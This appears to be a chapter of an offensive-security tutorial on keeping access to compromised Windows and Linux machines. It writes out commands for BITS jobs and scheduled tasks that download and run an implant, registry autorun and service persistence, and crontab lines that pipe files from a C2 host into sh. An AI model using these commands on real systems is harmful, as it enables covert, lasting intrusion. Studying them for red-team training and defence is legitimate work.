# Persistence

The point of achieving persistence is to be able to resume control of a target machine even if the machine is rebooted, restarted or the process that is running the implant is stopped for any reason. This needs to be done in a way that will not draw attention and also continue to evade defenses such as AV and other intrusion detection/protection systems.

There are a variety of different ways of achieving persistence. The MITRE ATT&CK framework lists a range of techniques which can be summarized as follows:

* Account manipulation including account creation, using valid credentials \(passwords, hashes, Kerberos Gold and Silver Tickets\) locally or with remote services
* Boot or Login Austostart Execution/Initialization Scripts
* Create or modify system process
* Event triggered execution
* Hijack execution flow
* Office application startup
* Pre-OS Boot
* Scheduled Task/Job including BITS Jobs
* Server software component
* Traffic signaling

We won't go through all of these separately but will deal with a few by way of example. We have already come across some of these techniques, especially the first, using valid credentials, including hashes and Kerberos tickets. The caveat with using accounts, including created accounts to remotely access a machine or file system is that any unusual activity of accounts can potentially trigger alerts.

Of the remainder of the techniques, the actual procedures involved in these are specific to platform and so we will deal with each platform in turn.

## Windows Persistence

### BITS Jobs

BITS is the Background Intelligent Transfer Service which runs scheduled jobs to upload or download files and monitor their progress. There is a utility program bitsadmin.exe that can be used to configure BITS jobs, however, it will warn you that it is being deprecated and that there are PowerShell commands that should be used instead. The PowerShell commands are missing the ability to run a program after the BITS job completes and this is the feature we are counting on to run our implant. So for the time being, we will run through how to run a PowerShell grunt using BITS.

To create a BITS job, we sue the command:

```bash
bitsadmin /create myjob
```

 If we want to download the grunt, we can then use the command

```bash
bitsadmin /addfile myjob http://192.168.114.2:8000/grunt.bat c:\users\rin\grunt.bat
```

Note that if the implant was already on the machine, this part can be set to a non-valid URL, it isn't important to running the file which we do with the following command:

```bash
bitsadmin /SetNotifyCmdLine persistjob cmd.exe "/c bitsadmin.exe /complete myjob && cmd.exe /c c:\users\rin\Desktop\grunt.bat"
```

We need to run bitsadmin.exe /complete myjob because bitsadmin won't actually copy the downloaded file to its destination until this is called. After that finishes, the grunt.bat script file is run. This will pop up a cmd.exe window and so there are other ways of downloading and executing the PowerShell without running it in a command prompt.

If the download command is invalid, i.e. it returns a 404, the command will retry if a SetMinRetryDelay is set:

```bash
bitsadmin /SetMinRetryDelay persistjob 120
```

Otherwise, it is possible to combine the BITS job with a scheduled task which we will look at next.

### Scheduled Tasks

The Windows Task Scheduler allows for scripts or applications to be run at certain times or as a result of specific events. Tasks can be scheduled using the Windows GUI Task Scheduler or the command line schtasks. A task consists of a name that is used to identify it. It will run after being "triggered" at a specific time or after an event, such as logging on, or an event appearing in a log. The task will then execute an action which is either running a program, sending an email, or displaying a notification or take some other action. Executing the action can be constrained by certain conditions and finally, there are some settings that can be configured if the task fails for any reason.

For our purposes, we can use the schtasks application and simply create a task that will execute at a fixed time as follows:

```bash
schtasks /create /tn persistjob /tr "cmd.exe /c c:\Users\rin\Desktop\grunt.bat" /sc minute /mo 60
```

This is creating a task called "persistjob" with an action of running grunt.bat. The schedule \(/sc\) is defined in minutes and is set to run every 60 minutes \(/mn 60\) indefinitely. By default, the task will only run when the user is logged on.

As mentioned above, the scheduled task can be used to persist running the implant directly, or via a BITS job.

### Registry Keys

There are a variety of keys in the registry that can be used to achieve persistence. Examples include:

Autorun: keys at

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

Where HKCU is HKEY\_CURRENT\_USER. There are equivalent locations for HKEY\_LOCAL\_MACHINE \(HKLM\) that will run when any user logs on.

Registry keys can also be used to store actual scripts and the commands to run them. The C2 server PoshC2 for example will store a PowerShell script disguised as wallpaper in the key:

```bash
HKCU\Software\Microsoft\Windows\CurrentVersion\themes\Wallpaper777 (or another name)
```

It will run the script from the autorun keys mentioned above, using the name of IEUpdate, or use a scheduled task or place a shortcut file that is placed at

```bash
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk
```

### Services

A new service can be created to persist an implant. This can be done using PowerShell

New-Service -Name "Grunt" -BinaryPathName "C:\Windows\Temp\payload.exe" -Description "A Covenant Grunt" -StartupType Automatic

```bash
sc start Grunt
```

Remember that you will need elevated privileges to do this and you would normally make more of an attempt to disguise or hide the binary file.

There are a number of other techniques but these are the most common. We will have a look at how to achieve persistence on a Linux machine next.

## Linux Persistence

As with Windows, getting credentials of an existing user or creating a new user that has remote access to the machine through remote desktop or SSH is a straightforward way of achieving persistence. With SSH, an additional key can be added to a user's authorized\_keys file as well.

### Cron Jobs

As with scheduled tasks on Windows, Cron can be used to the same end to run a binary or script at specific times. A technique used by malware is to download a file that looks like a JPG and actually contains a reverse shell. Two ways of achieving that are:

```bash
*/11 * * * * wget -O - -q http://c2server.com/pics/logo.jpg|sh
*/5 * * * * curl http://c2server.com/malicious.png -k|dd skip=2446 bs=1|sh
```

These lines represent entries in a crontab. The format is to specify minute, hour, day of the month, month and day of the week in the first 5 positions. The command that is executed follows. In the case of the above entries, this would represent running the Cron job every 11 minutes \(\*/11\) and every 5 minutes \(\*/5\).

For a user to run a cron job, they need to be configured in the /etc/cron.allow file. An individual user's cron files are stored in /var/spool/cron/crontabs. Other cron entries may be in files located in /etc/cron.d and entries in the file /etc/crontab.

Metasploit has a module for establishing persistence with cron:

```bash
exploit/linux/local/cron_persistence
```

### Systemd service

Systemd is a service that uses configuration files to start, stop and report on other services on a Linux machine. The configuration files are located in /etc/systemd/system and /usr/lib/system. A new service can be created or an existing one modified to maintain persistence. Although an attacker would normally need root privileges to create or modify a service, it is possible to run a service as a user by putting a configuration file in the home directory of a user ~/.config/system/user/

Another popular application that is used to run supervised processes is supervisord

Metasploit has a module for achieving persistence using services:

```bash
use exploit/linux/local/service_persistence
```

